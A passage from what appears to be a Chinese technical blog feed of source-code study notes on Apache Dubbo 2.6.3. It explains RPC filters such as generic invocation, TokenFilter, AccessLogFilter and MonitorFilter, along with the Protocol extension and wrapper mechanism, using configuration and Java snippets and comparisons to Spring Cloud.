class="hljs-tag">&lt;<span class="hljs-name">dubbo:parameter</span> <span class="hljs-attr">key</span>=<span class="hljs-string">"jvalidation"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"org.hibernate.validator.HibernateValidator"</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dubbo:reference</span>&gt;</span></code></pre><p>filter要是配置多个的话，用逗号拼接，但是逗号前后不能有空格。<br>此处使用了hibernate的validator ，在你需要校验的接口方法上加校验注解即可，示例如下：  </p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">queryUser</span><span class="hljs-params">(@Range(min=<span class="hljs-number">0</span>,message=<span class="hljs-string">"用户id值不能小于0"</span>)</span><span class="hljs-keyword">int</span> id)</span>;</code></pre><p>当consumer端调用时传递了校验不通过的参数时，会收到ConstraintViolationException的异常。  </p><h3 id="实现原理-1"><a href="#实现原理-1" class="headerlink" title="实现原理"></a>实现原理</h3><p>dubbo对接了javax.validation.Validation，hibernate等都有对其对接的实现，按需使用即可。也就是说dubbo自己不做具体校验的事情。    </p><h3 id="与Spring-Cloud对比-1"><a href="#与Spring-Cloud对比-1" class="headerlink" title="与Spring Cloud对比"></a>与Spring Cloud对比</h3><p>spring在很早就支持validator。  </p><h2 id="EchoFilter"><a href="#EchoFilter" class="headerlink" title="EchoFilter"></a>EchoFilter</h2><h3 id="作用-2"><a href="#作用-2" class="headerlink" title="作用"></a>作用</h3><p>在provider端提供回声服务的服务端的实现。  </p><h3 id="使用方式-2"><a href="#使用方式-2" class="headerlink" title="使用方式"></a>使用方式</h3><p>这个filter略有特殊，无需在provider端的dubbo:service标签的filter中去配置，只要你在consumer做了echo回声调用，他都会产生作用，调试的时候也能看到能走到EchoFilter中。  </p><p>consumer端的示例代码：  </p><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloClientTest</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-meta">@Autowired</span>    <span class="hljs-keyword">private</span> HelloService helloService;    <span class="hljs-meta">@SuppressWarnings</span>(<span class="hljs-string">"static-access"</span>)    <span class="hljs-meta">@Test</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">testSayHello</span><span class="hljs-params">()</span></span><span class="hljs-function">    </span>&#123;        System.out.println(((EchoService)helloService).$echo(<span class="hljs-string">"aaaa"</span>));    &#125;&#125;</code></pre><p>就是把你的service类强转成EchoService，至于为什么能强转，可以参见之前写的文章 reference bean发起调用  </p><h3 id="实现原理-2"><a href="#实现原理-2" class="headerlink" title="实现原理"></a>实现原理</h3><p>直接看EchoFilter代码，很简单，不再多说。  </p><h3 id="与Spring-Cloud对比-2"><a href="#与Spring-Cloud对比-2" class="headerlink" title="与Spring Cloud对比"></a>与Spring Cloud对比</h3><p>Spring Cloud貌似没有这个能力。</p><h2 id="GenericFilter"><a href="#GenericFilter" class="headerlink" title="GenericFilter"></a>GenericFilter</h2><h3 id="作用-3"><a href="#作用-3" class="headerlink" title="作用"></a>作用</h3><p>先讨论一个问题，rpc，最简单的场景是consumer端调用provider端的一个服务，这个服务双方都遵循一个接口实现，按最简单的dubbo的demo玩法，是需要consumer和provider两段都要有这个接口声明的（包括接口参数的类型的相关类），比如：<br>org.simonme.dubbo.demo.provider.service.UserService.queryUser(int) 这是一个查询用户的服务接口，但是，如果consumer端没有这个服务的接口声明及其相关联的bean类，也就是如果仅仅在provider端能找到这个接口类，在consumer工程里压根没有这个类，那是否还能进行调用？<br>dubbo是可以的。 就是通过在proivder侧用GenericFilter达成目的。  </p><h3 id="使用方式-3"><a href="#使用方式-3" class="headerlink" title="使用方式"></a>使用方式</h3><p>需要在consumer端声明这个bean的时候，加上<code>generic=&quot;true&quot;</code>配置即可。  </p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dubbo:reference</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"userService"</span> <span class="hljs-attr">interface</span>=<span class="hljs-string">"org.simonme.dubbo.demo.provider.service.UserService"</span> <span class="hljs-attr">generic</span>=<span class="hljs-string">"true"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dubbo:reference</span>&gt;</span></code></pre><p>generic还支持nativejava和bean两个可选的选项。nativejava对应byte[]类型的参数，bean对应com.alibaba.dubbo.common.beanutil.JavaBeanDescriptor类型的参数。 </p><p>此外在使用这个服务时，形式略有不同：  </p><pre><code class="hljs java"><span class="hljs-meta">@Autowired</span><span class="hljs-keyword">private</span> GenericService userService;<span class="hljs-meta">@SuppressWarnings</span>(<span class="hljs-string">"static-access"</span>)<span class="hljs-meta">@Test</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">testSayHello</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    Object result = userService.$invoke(<span class="hljs-string">"queryUser"</span>, <span class="hljs-keyword">new</span> String[] &#123; <span class="hljs-string">"int"</span> &#125;,  <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-number">100</span>&#125;);    System.out.println(result);    System.out.println(result.getClass());&#125;</code></pre><p>用<code>GenericService</code> 表示你这个未知的服务类型，用<code>$invoke</code>这个特殊方法发起的你的服务方法调用。调用完之后，dubbo会把结果以hashmap的形式返回给你。比如，我这里是个User的bean，User有id和name字段，那么返回的map中就与id和value两个key，其对应的值就是bean的这两个字段的字段值。<br>为了便于理解，贴一下UserService的代码:  </p><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">UserService</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">queryUser</span><span class="hljs-params">(@Range(min=<span class="hljs-number">0</span>,message=<span class="hljs-string">"用户id值不能小于0"</span>)</span><span class="hljs-keyword">int</span> id)</span>;&#125;</code></pre><p>上面这个写法，解释了怎么在consumer端没有org.simonme.dubbo.demo.provider.service.UserService接口声明的时候，调用他的queryUser方法。provider端无需改动，和正常写rpc服务一样配置即可。<br>用法也可以参见官方文档，<a href="http://dubbo.apache.org/zh-cn/docs/user/demos/generic-reference.html" target="_blank" rel="noopener">使用泛化调用</a>。</p><h3 id="实现原理-3"><a href="#实现原理-3" class="headerlink" title="实现原理"></a>实现原理</h3><p>直接看GenericFilter代码，通过方法名(必须是$invoke),参数个数等判断是否命中，很简单，不再多说。 </p><h3 id="与Spring-Cloud对比-3"><a href="#与Spring-Cloud对比-3" class="headerlink" title="与Spring Cloud对比"></a>与Spring Cloud对比</h3><p>Spring Cloud可以算有这个能力，因为Spring Cloud是http json的，http json天然不需要调用端有接口声明。</p><h2 id="GenericImplFilter"><a href="#GenericImplFilter" class="headerlink" title="GenericImplFilter"></a>GenericImplFilter</h2><h3 id="作用-4"><a href="#作用-4" class="headerlink" title="作用"></a>作用</h3><p>与 GenericFilter  类似，是一个相对的东西，他是用在provider端没有服务接口声明类时，使用的。使用方法可以参见官方文档<a href="http://dubbo.apache.org/zh-cn/docs/user/demos/generic-service.html" target="_blank" rel="noopener">实现泛化调用</a>。不再多说。 </p><h2 id="TokenFilter"><a href="#TokenFilter" class="headerlink" title="TokenFilter"></a>TokenFilter</h2><h3 id="作用-5"><a href="#作用-5" class="headerlink" title="作用"></a>作用</h3><p><a href="http://dubbo.apache.org/zh-cn/docs/user/demos/token-authorization.html" target="_blank" rel="noopener">官方文档</a>说法是：  </p><blockquote><p>通过令牌验证在注册中心控制权限，以决定要不要下发令牌给消费者，可以防止消费者绕过注册中心访问提供者，另外通过注册中心可灵活改变授权方式，而不需修改或升级提供者。</p></blockquote><h3 id="使用方式-4"><a href="#使用方式-4" class="headerlink" title="使用方式"></a>使用方式</h3><p>provider端：在provider上配置token值。 TokenFilter会在provider侧校验。 </p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dubbo:service</span> <span class="hljs-attr">interface</span>=<span class="hljs-string">"org.simonme.dubbo.demo.provider.service.UserService"</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"m00001.app001.xx.userService"</span> <span class="hljs-attr">timeout</span>=<span class="hljs-string">"600000"</span> <span class="hljs-attr">token</span>=<span class="hljs-string">"123456"</span>&gt;</span></code></pre><p>consumer端可以用编程的方式获取后塞， </p><pre><code class="hljs java">RpcContext.getContext().setAttachment(<span class="hljs-string">"token"</span>, <span class="hljs-string">"a37b6115-c171-43cd-b65c-38b636ee96cc"</span>);</code></pre><p>或者通过配置parameter，  </p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dubbo:parameter</span> <span class="hljs-attr">key</span>=<span class="hljs-string">"token"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"123456"</span> /&gt;</span></code></pre><p>或者<code>啥都不要处理</code>，默认consumer会从provider服务url中解析到。provider的url中会含有token字段。  </p><h3 id="实现原理-4"><a href="#实现原理-4" class="headerlink" title="实现原理"></a>实现原理</h3><p>如果 token 配置的是true， 那么在provider export服务时，<code>ServiceConfig</code>会生成UUID，这个其实不是由注册中心生成的。<br>当然token也支持配置固定密码。<br>比对过程：   </p><pre><code class="hljs java"><span class="hljs-keyword">if</span> (!ConfigUtils.isEmpty(token)) &#123;    <span class="hljs-keyword">if</span> (ConfigUtils.isDefault(token)) &#123;<span class="hljs-comment">// 是 true或者default字段串就是表示默认</span>        map.put(Constants.TOKEN_KEY, UUID.randomUUID().toString());    &#125; <span class="hljs-keyword">else</span> &#123;        map.put(Constants.TOKEN_KEY, token);    &#125;&#125;</code></pre><p>consumer端如果没有通过上述代码的方式或者parameter配置的方式传送token，那么consumer端会在调用时，先将从注册中心拿到的provider端的url中部分参数转换成attachment给consumer端用，这个部分参数就包括token。具体代码在<code>DubboInvoker</code>中，如下：  </p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">DubboInvoker</span><span class="hljs-params">(Class&lt;T&gt; serviceType, URL url, ExchangeClient[] clients, Set&lt;Invoker&lt;?&gt;&gt; invokers)</span> </span>&#123;    <span class="hljs-keyword">super</span>(serviceType, url, <span class="hljs-keyword">new</span> String[]&#123;Constants.INTERFACE_KEY, Constants.GROUP_KEY, Constants.TOKEN_KEY, Constants.TIMEOUT_KEY&#125;);<span class="hljs-comment">// 此处会调用父类方法进行需要的参数从url转到attachment中</span>    <span class="hljs-keyword">this</span>.clients = clients;    <span class="hljs-comment">// get version.</span>    <span class="hljs-keyword">this</span>.version = url.getParameter(Constants.VERSION_KEY, <span class="hljs-string">"0.0.0"</span>);    <span class="hljs-keyword">this</span>.invokers = invokers;&#125;</code></pre><p>当provider端使用注册中心，consumer试图不带token进行直接消费时，会被拒绝。 当consumer端也是连注册中心时，哪怕不送显式送token(实际上dubbo会自动送)也可以正常调用。但是如果consumer端用了注册中心，且显式送了token，那么就要送对。否则报错。</p><h3 id="与Spring-Cloud对比-4"><a href="#与Spring-Cloud对比-4" class="headerlink" title="与Spring Cloud对比"></a>与Spring Cloud对比</h3><p>Spring Cloud的注册中心eureka也是支持密码验证的。</p><h2 id="AccessLogFilter"><a href="#AccessLogFilter" class="headerlink" title="AccessLogFilter"></a>AccessLogFilter</h2><h3 id="作用-6"><a href="#作用-6" class="headerlink" title="作用"></a>作用</h3><p>用在provider端打印rpc请求日志，支持打到指定文件，支持异步。  </p><h3 id="使用方式-5"><a href="#使用方式-5" class="headerlink" title="使用方式"></a>使用方式</h3><p>在provider侧配置名为accesslog的filter，若需要指定路径，则将accesslog参数设置成具体路径即可,默认需要将其配置成true。  </p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dubbo:service</span> <span class="hljs-attr">interface</span>=<span class="hljs-string">"org.simonme.dubbo.demo.provider.service.UserService"</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"m00001.app001.xx.userService"</span> <span class="hljs-attr">filter</span>=<span class="hljs-string">"accesslog"</span> </span><span class="hljs-tag">    <span class="hljs-attr">timeout</span>=<span class="hljs-string">"600000"</span> <span class="hljs-attr">token</span>=<span class="hljs-string">"123456"</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">dubbo:parameter</span> <span class="hljs-attr">key</span>=<span class="hljs-string">"accesslog"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"true"</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dubbo:service</span>&gt;</span></code></pre><h3 id="实现原理-5"><a href="#实现原理-5" class="headerlink" title="实现原理"></a>实现原理</h3><p>参见AccessLogFilter 代码，比较简单。</p><h3 id="与Spring-Cloud对比-5"><a href="#与Spring-Cloud对比-5" class="headerlink" title="与Spring Cloud对比"></a>与Spring Cloud对比</h3><p>zuul网关也支持。<br>zuul.debug.request=true  #如果设置了这个，默认所有的请求都会debug<br>zuul.include-debug-header: true  #打印头<br>未设置zuul.debug.request=true，可以用zuul_host:zuul_port/路径?debug=true    debug你的指定请求  </p><h2 id="ActiveLimitFilter"><a href="#ActiveLimitFilter" class="headerlink" title="ActiveLimitFilter"></a>ActiveLimitFilter</h2><h3 id="作用-7"><a href="#作用-7" class="headerlink" title="作用"></a>作用</h3><p>在consumer端实现并发数控制，能支持到方法级。 </p><h3 id="使用方式-6"><a href="#使用方式-6" class="headerlink" title="使用方式"></a>使用方式</h3><p>在consumer侧配置  </p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dubbo:reference</span> <span class="hljs-attr">interface</span>=<span class="hljs-string">"com.foo.BarService"</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">dubbo:method</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"sayHello"</span> <span class="hljs-attr">actives</span>=<span class="hljs-string">"10"</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dubbo:service</span>&gt;</span></code></pre><h3 id="实现原理-6"><a href="#实现原理-6" class="headerlink" title="实现原理"></a>实现原理</h3><p>ConcurrentHashMap 配合 AtomicInteger AtomicLong完成。相关代码参见 ActiveLimitFilter 与 RpcStatus。</p><h3 id="与Spring-Cloud对比-6"><a href="#与Spring-Cloud对比-6" class="headerlink" title="与Spring Cloud对比"></a>与Spring Cloud对比</h3><p>Spring Cloud也支持。  </p><p>ExecuteLimitFilter 与之类似，只是用在了provider端。  </p><h2 id="ClassLoaderFilter"><a href="#ClassLoaderFilter" class="headerlink" title="ClassLoaderFilter"></a>ClassLoaderFilter</h2><h3 id="作用-8"><a href="#作用-8" class="headerlink" title="作用"></a>作用</h3><p>保持 调用下层invoker前后的ClassLoader一致  </p><h2 id="ContextFilter"><a href="#ContextFilter" class="headerlink" title="ContextFilter"></a>ContextFilter</h2><h3 id="作用-9"><a href="#作用-9" class="headerlink" title="作用"></a>作用</h3><p>在provider端，对一些dubbo自己使用的保留key进行过滤，防止别人误传。  </p><h3 id="实现原理-7"><a href="#实现原理-7" class="headerlink" title="实现原理"></a>实现原理</h3><p>参见代码即可，比较简单。  </p><h3 id="与Spring-Cloud对比-7"><a href="#与Spring-Cloud对比-7" class="headerlink" title="与Spring Cloud对比"></a>与Spring Cloud对比</h3><p>N/A</p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dubbo源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dubbo-rpc-filter-2</title>
    <link href="/2020/04/24/dubbo-rpc-filter-2/"/>
    <url>/2020/04/24/dubbo-rpc-filter-2/</url>
    
    <content type="html"><![CDATA[<p>2.6.3版本，之前读的是2.4.9版本<br>本篇主要阐述dubbo rpc的filter的实现，包括作用，用法，原理，与Spring Cloud在这些能力的对比。  </p><p>整个filter列表的获取过程在<br>com.alibaba.dubbo.rpc.protocol.ProtocolFilterWrapper.buildInvokerChain(Invoker<T>, String, String)  </p><pre><code class="hljs java">List&lt;Filter&gt; filters = ExtensionLoader.getExtensionLoader(Filter<span class="hljs-class">.<span class="hljs-keyword">class</span>).<span class="hljs-title">getActivateExtension</span>(<span class="hljs-title">invoker</span>.<span class="hljs-title">getUrl</span>(), <span class="hljs-title">key</span>, <span class="hljs-title">group</span>)</span>;</code></pre><p><code>getActivateExtension</code>会根据filter的注解与url中配置参数结合，过滤出本次命中的filter。  </p><a id="more"></a><h2 id="ConsumerContextFilter"><a href="#ConsumerContextFilter" class="headerlink" title="ConsumerContextFilter"></a>ConsumerContextFilter</h2><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>在consumer端，进行一些参数设置，诸如本端地址，对端地址等。    </p><h3 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h3><p>无需配置，consumer侧默认使用。<br>在dubbo中，对于这些filter如果在META-INF中配置了且filter类的注解@Activate上没有配置value值，那么就是默认使用。 可以参见com.alibaba.dubbo.common.extension.ExtensionLoader.isActive(Activate, URL)方法实现。  </p><h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><p>参见代码即可，比较简单。  </p><h3 id="与Spring-Cloud对比"><a href="#与Spring-Cloud对比" class="headerlink" title="与Spring Cloud对比"></a>与Spring Cloud对比</h3><p>N/A</p><h2 id="ExceptionFilter"><a href="#ExceptionFilter" class="headerlink" title="ExceptionFilter"></a>ExceptionFilter</h2><h3 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h3><p>在provider端，对调用异常进行选择性进行包装。<br>非受检异常直接抛出，jdk的异常直接抛出，异常类与接口类在一个jar包内的直接抛出，是服务接口方法自己声明的要throw的异常直接抛出。<br>其余包装成受检异常放到RpcResult中返回。    </p><h3 id="使用方式-1"><a href="#使用方式-1" class="headerlink" title="使用方式"></a>使用方式</h3><p>无需配置，provider侧默认使用。  </p><h3 id="实现原理-1"><a href="#实现原理-1" class="headerlink" title="实现原理"></a>实现原理</h3><p>参见代码即可，比较简单。  </p><h3 id="与Spring-Cloud对比-1"><a href="#与Spring-Cloud对比-1" class="headerlink" title="与Spring Cloud对比"></a>与Spring Cloud对比</h3><p>N/A</p><h2 id="DeprecatedFilter"><a href="#DeprecatedFilter" class="headerlink" title="DeprecatedFilter"></a>DeprecatedFilter</h2><h3 id="作用-2"><a href="#作用-2" class="headerlink" title="作用"></a>作用</h3><p>对于DEPRECATED的方法打一行错误日志。  是配置在consumer端，没太明白他的实际作用，既然要在consumer端配置DEPRECATED，还要打日志做啥呢？consumer端就知道了啊。 有点不解。 或许就是为了标注，这是一个废弃的调用吧。  </p><h3 id="使用方式-2"><a href="#使用方式-2" class="headerlink" title="使用方式"></a>使用方式</h3><p>consumer端配置。  </p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dubbo:reference</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"userService"</span> <span class="hljs-attr">interface</span>=<span class="hljs-string">"org.simonme.dubbo.demo.provider.service.UserService"</span> <span class="hljs-attr">filter</span>=<span class="hljs-string">"deprecated"</span> &gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">dubbo:method</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"queryUser"</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dubbo:parameter</span> <span class="hljs-attr">key</span>=<span class="hljs-string">"deprecated"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"true"</span> /&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">dubbo:method</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dubbo:reference</span>&gt;</span></code></pre><h3 id="实现原理-2"><a href="#实现原理-2" class="headerlink" title="实现原理"></a>实现原理</h3><p>参见代码即可，比较简单。  </p><h3 id="与Spring-Cloud对比-2"><a href="#与Spring-Cloud对比-2" class="headerlink" title="与Spring Cloud对比"></a>与Spring Cloud对比</h3><p>Spring Cloud貌似没有这个能力。  </p><h2 id="CompatibleFilter"><a href="#CompatibleFilter" class="headerlink" title="CompatibleFilter"></a>CompatibleFilter</h2><h3 id="作用-3"><a href="#作用-3" class="headerlink" title="作用"></a>作用</h3><p>兼容适配器，能对结果返回值做一些类型转换，注入基本类型到装箱类型的互转，复合类型到序列化值的转换(依赖你配置的序列化类型)等。    </p><h3 id="使用方式-3"><a href="#使用方式-3" class="headerlink" title="使用方式"></a>使用方式</h3><p>在consumer配置的filter上加上compatible即可。  </p><h3 id="实现原理-3"><a href="#实现原理-3" class="headerlink" title="实现原理"></a>实现原理</h3><p>参见CompatibleFilter代码即可，比较简单。  </p><h3 id="与Spring-Cloud对比-3"><a href="#与Spring-Cloud对比-3" class="headerlink" title="与Spring Cloud对比"></a>与Spring Cloud对比</h3><p>TODO</p><h2 id="TimeoutFilter"><a href="#TimeoutFilter" class="headerlink" title="TimeoutFilter"></a>TimeoutFilter</h2><h3 id="作用-4"><a href="#作用-4" class="headerlink" title="作用"></a>作用</h3><p>用在provider侧，对超时的服务调用，打一个警告日志。      </p><h3 id="使用方式-4"><a href="#使用方式-4" class="headerlink" title="使用方式"></a>使用方式</h3><p>无需配置，默认生效。 </p><h3 id="实现原理-4"><a href="#实现原理-4" class="headerlink" title="实现原理"></a>实现原理</h3><p>参见TimeoutFilter代码即可，比较简单。  </p><h3 id="与Spring-Cloud对比-4"><a href="#与Spring-Cloud对比-4" class="headerlink" title="与Spring Cloud对比"></a>与Spring Cloud对比</h3><p>TODO</p><h2 id="TraceFilter"><a href="#TraceFilter" class="headerlink" title="TraceFilter"></a>TraceFilter</h2><h3 id="作用-5"><a href="#作用-5" class="headerlink" title="作用"></a>作用</h3><p>用在provider侧。     </p><h3 id="使用方式-5"><a href="#使用方式-5" class="headerlink" title="使用方式"></a>使用方式</h3><p>无需配置，默认启用这个filter，但是要真正trace，需要telnet管理台，给其发指令，才能真正trace。支持指定接口，指定方法，指定最大trace多少次。 </p><h3 id="实现原理-5"><a href="#实现原理-5" class="headerlink" title="实现原理"></a>实现原理</h3><p>trace的内容如下：</p><pre><code class="hljs java"><span class="hljs-keyword">if</span> (count &lt; max) &#123;    String prompt = channel.getUrl().getParameter(Constants.PROMPT_KEY, Constants.DEFAULT_PROMPT);      channel.send(<span class="hljs-string">"\r\n"</span> + RpcContext.getContext().getRemoteAddress() + <span class="hljs-string">" -&gt; "</span>                                        + invoker.getInterface().getName()                                        + <span class="hljs-string">"."</span> + invocation.getMethodName()                                        + <span class="hljs-string">"("</span> + JSON.toJSONString(invocation.getArguments()) + <span class="hljs-string">")"</span> + <span class="hljs-string">" -&gt; "</span> + JSON.toJSONString(result.getValue())                                        + <span class="hljs-string">"\r\nelapsed: "</span> + (end - start) + <span class="hljs-string">" ms."</span>                                        + <span class="hljs-string">"\r\n\r\n"</span> + prompt);&#125;</code></pre><h3 id="与Spring-Cloud对比-5"><a href="#与Spring-Cloud对比-5" class="headerlink" title="与Spring Cloud对比"></a>与Spring Cloud对比</h3><p>TODO</p><h2 id="FutureFilter"><a href="#FutureFilter" class="headerlink" title="FutureFilter"></a>FutureFilter</h2><h3 id="作用-6"><a href="#作用-6" class="headerlink" title="作用"></a>作用</h3><p>用在consumer侧。<a href="http://dubbo.apache.org/zh-cn/docs/user/demos/events-notify.html" target="_blank" rel="noopener">dubbo的事件机制</a>支持oninvoke、onreturn、onreturn事件监听，就是靠这个filter完成对接。       </p><h3 id="使用方式-6"><a href="#使用方式-6" class="headerlink" title="使用方式"></a>使用方式</h3><p>参见<a href="http://dubbo.apache.org/zh-cn/docs/user/demos/events-notify.html" target="_blank" rel="noopener">dubbo的事件机制</a>。  </p><h3 id="实现原理-6"><a href="#实现原理-6" class="headerlink" title="实现原理"></a>实现原理</h3><p>比较简单，参见FutureFilter代码。或者参见<a href="https://blog.csdn.net/u013160932/article/details/81144471" target="_blank" rel="noopener">Dubbo源码分析—-过滤器之FutureFilter</a>  </p><h3 id="与Spring-Cloud对比-6"><a href="#与Spring-Cloud对比-6" class="headerlink" title="与Spring Cloud对比"></a>与Spring Cloud对比</h3><p>TODO</p><h3 id="与Spring-Cloud对比-7"><a href="#与Spring-Cloud对比-7" class="headerlink" title="与Spring Cloud对比"></a>与Spring Cloud对比</h3><p>TODO</p><h2 id="MonitorFilter"><a href="#MonitorFilter" class="headerlink" title="MonitorFilter"></a>MonitorFilter</h2><h3 id="作用-7"><a href="#作用-7" class="headerlink" title="作用"></a>作用</h3><p>consumer,provider侧都可用。 会将服务的耗时，并发数等送给监控服务。      </p><h3 id="使用方式-7"><a href="#使用方式-7" class="headerlink" title="使用方式"></a>使用方式</h3><p>filter默认启用，但是需要配置后才能触发监控。 配置dubbo:monitor。</p><h3 id="实现原理-7"><a href="#实现原理-7" class="headerlink" title="实现原理"></a>实现原理</h3><p>比较简单，参见MonitorFilter。  具体收集监控动作由<code>MonitorService</code>接口实现完成。dubbo自带了<code>DubboMonitor</code>实现。收集的数据暂时同步擦欧洲放在一个ConcurrentHashMap中，再由ScheduledExecutorService定时异步发送。</p><h3 id="与Spring-Cloud对比-8"><a href="#与Spring-Cloud对比-8" class="headerlink" title="与Spring Cloud对比"></a>与Spring Cloud对比</h3><p>Spring Cloud有专门的组件干这个。</p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dubbo源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dubbo Protocol实现剖析</title>
    <link href="/2020/04/24/dubbo-protocol-impl/"/>
    <url>/2020/04/24/dubbo-protocol-impl/</url>
    
    <content type="html"><![CDATA[<hr><p>2.6.3版本，之前读的是2.4.9版本<br>本篇主要阐述dubbo rpc的com.alibaba.dubbo.rpc.Protocol的实现，包括作用，用法，原理等等。</p><h1 id="类与接口关系以及其装配"><a href="#类与接口关系以及其装配" class="headerlink" title="类与接口关系以及其装配"></a>类与接口关系以及其装配</h1><p>根据类与接口关系文档可以看到Protocol实现关系如下：<br>264 Protocol<br>–264.1 QosProtocolWrapper<br>–264.2 RegistryProtocol<br>–264.3 AbstractProtocol<br>—-264.3.1 AbstractProxyProtocol<br>——264.3.1.1 HessianProtocol<br>——264.3.1.2 HttpProtocol<br>——264.3.1.3 RestProtocol<br>——264.3.1.4 RmiProtocol<br>——264.3.1.5 WebServiceProtocol<br>—-264.3.2 DubboProtocol<br>—-264.3.3 InjvmProtocol<br>—-264.3.4 MemcachedProtocol<br>—-264.3.5 RedisProtocol<br>—-264.3.6 ThriftProtocol<br>—-264.3.7 MockProtocol<br>–264.4 InjvmProtocol<br>–264.5 ProtocolFilterWrapper<br>–264.6 ProtocolListenerWrapper<br>默认会用到 QosProtocolWrapper RegistryProtocol(如果有注册中心) DubboProtocol InjvmProtocol  ProtocolFilterWrapper ProtocolListenerWrapper。  </p><a id="more"></a><p>在META-INF/dubbo/internal/com.alibaba.dubbo.rpc.Protocol中做了装配<br>filter=com.alibaba.dubbo.rpc.protocol.ProtocolFilterWrapper<br>listener=com.alibaba.dubbo.rpc.protocol.ProtocolListenerWrapper<br>mock=com.alibaba.dubbo.rpc.support.MockProtocol<br>dubbo=com.alibaba.dubbo.rpc.protocol.dubbo.DubboProtocol<br>injvm=com.alibaba.dubbo.rpc.protocol.injvm.InjvmProtocol<br>rmi=com.alibaba.dubbo.rpc.protocol.rmi.RmiProtocol<br>hessian=com.alibaba.dubbo.rpc.protocol.hessian.HessianProtocol<br>com.alibaba.dubbo.rpc.protocol.http.HttpProtocol<br>com.alibaba.dubbo.rpc.protocol.webservice.WebServiceProtocol<br>thrift=com.alibaba.dubbo.rpc.protocol.thrift.ThriftProtocol<br>memcached=com.alibaba.dubbo.rpc.protocol.memcached.MemcachedProtocol<br>redis=com.alibaba.dubbo.rpc.protocol.redis.RedisProtocol<br>rest=com.alibaba.dubbo.rpc.protocol.rest.RestProtocol<br>registry=com.alibaba.dubbo.registry.integration.RegistryProtocol<br>qos=com.alibaba.dubbo.qos.protocol.QosProtocolWrapper </p><h1 id="扩展点机制createAdaptiveExtensionClass"><a href="#扩展点机制createAdaptiveExtensionClass" class="headerlink" title="扩展点机制createAdaptiveExtensionClass"></a>扩展点机制createAdaptiveExtensionClass</h1><p>要看懂protocol的实例化与export过程最好先了解下扩展点机制，前面有文章写过。 此处要需要注意ExtensionLoader类的下面代码：  </p><pre><code class="hljs java"><span class="hljs-keyword">private</span> Class&lt;?&gt; createAdaptiveExtensionClass() &#123;    String code = createAdaptiveExtensionClassCode();    ClassLoader classLoader = findClassLoader();    com.alibaba.dubbo.common.compiler.Compiler compiler = ExtensionLoader.getExtensionLoader(com.alibaba.dubbo.common.compiler.Compiler<span class="hljs-class">.<span class="hljs-keyword">class</span>).<span class="hljs-title">getAdaptiveExtension</span>()</span>;    <span class="hljs-keyword">return</span> compiler.compile(code, classLoader);&#125;</code></pre><p>再协议初始化与export时会动态生成的两个类的代码：  Protocol$Adaptive，ProxyFactory$Adaptive，看上面code变量就是生成的具体代码了。 </p><h1 id="protocol及其wrap之间的关系"><a href="#protocol及其wrap之间的关系" class="headerlink" title="protocol及其wrap之间的关系"></a>protocol及其wrap之间的关系</h1><p>在扩展点机制com.alibaba.dubbo.common.extension.ExtensionLoader.createExtension(String)中：<br>在创建扩展实例时，会同时对他的wrap类的实例进行创建，代码细节如下：</p><pre><code class="hljs java">T instance = (T) EXTENSION_INSTANCES.get(clazz);<span class="hljs-keyword">if</span> (instance == <span class="hljs-keyword">null</span>) &#123;    EXTENSION_INSTANCES.putIfAbsent(clazz, clazz.newInstance());    instance = (T) EXTENSION_INSTANCES.get(clazz);&#125;injectExtension(instance);<span class="hljs-comment">// 此时是DubboProtocol示例</span>Set&lt;Class&lt;?&gt;&gt; 